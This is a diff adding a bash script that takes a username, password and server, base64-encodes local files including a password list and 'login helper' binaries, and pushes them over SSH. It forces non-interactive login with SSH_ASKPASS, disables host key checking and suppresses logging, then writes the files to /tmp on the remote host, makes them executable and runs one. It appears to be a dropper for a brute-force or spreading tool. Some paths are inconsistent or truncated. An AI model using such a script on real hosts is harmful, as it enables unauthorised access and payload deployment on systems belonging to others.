@@ -1,0 +1,46 @@
+#!/bin/bash
+USER=$1
+PASS=$2
+SERVER=$3
+echo $1 $2 $3
+
+SCRIPT_PATH=/tmp/work
+REMOTE_SCRIPT_PATH=/tmp/yes
+HELP_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/linuxloginhelper`
+PASS_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/passwdlist.txt`
+SCRIPT_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/script.sh`
+LOGIN_SCRIPT=`base64 --wrap=0 ${SCRIPT_PATH}/thelinuxlogin`
+SSH_OPTIONS="-oLogLevel=error"
+SSH_OPTIONS="${SSH_OPTIONS} -oStrictHostKeyChecking=no"
+SSH_OPTIONS="${SSH_OPTIONS} -oUserKnownHostsFile=/dev/null"
+CMD="mkdir ${REMOTE_SCRIPT_PATH};"
+CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/linuxloginhelper <<< ${HELP_SCRIPT};"
+CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/passwdlist.txt <<< ${PASS_SCRIPT};"
+CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/script.sh <<< ${SCRIPT_SCRIPT};"
+CMD="${CMD} base64 -d - > ${REMOTE_SCRIPT_PATH}/thelinuxlogin <<< ${LOGIN_SCRIPT};"
+CMD="${CMD} chmod u+x ${REMOTE_SCRIPT_PATH}/linuxloginscript;"
+CMD="${CMD} chmod u+x ${REMOTE_SCRIPT_PATH}/thelinuxlogin;"
+CMD="${CMD} bash $REMOTE_SCRIPT_PATH/t"
+
+echo $CMD
+echo $SSH_OPTIONS
+
+SSH_ASKPASS_SCRIPT=/tmp/ssh-askpass-script
+cat > ${SSH_ASKPASS_SCRIPT} <<EOL
+echo "${PASS}"
+EOL
+chmod u+x ${SSH_ASKPASS_SCRIPT}
+ 
+#----------------------------------------------------------------------
+# Set up other items needed for OpenSSH to work.
+#----------------------------------------------------------------------
+ 
+# Set no display, necessary for ssh to play nice with setsid and SSH_ASKPASS.
+export DISPLAY=:0
+ 
+# Tell SSH to read in the output of the provided script as the password.
+# We still have to use setsid to eliminate access to a terminal and thus avoid
+# it ignoring this and asking for a password.
+export SSH_ASKPASS=${SSH_ASKPASS_SCRIPT}
+ 
+setsid ssh ${SSH_OPTIONS} ${USER}@${SERVER} "${CMD}"
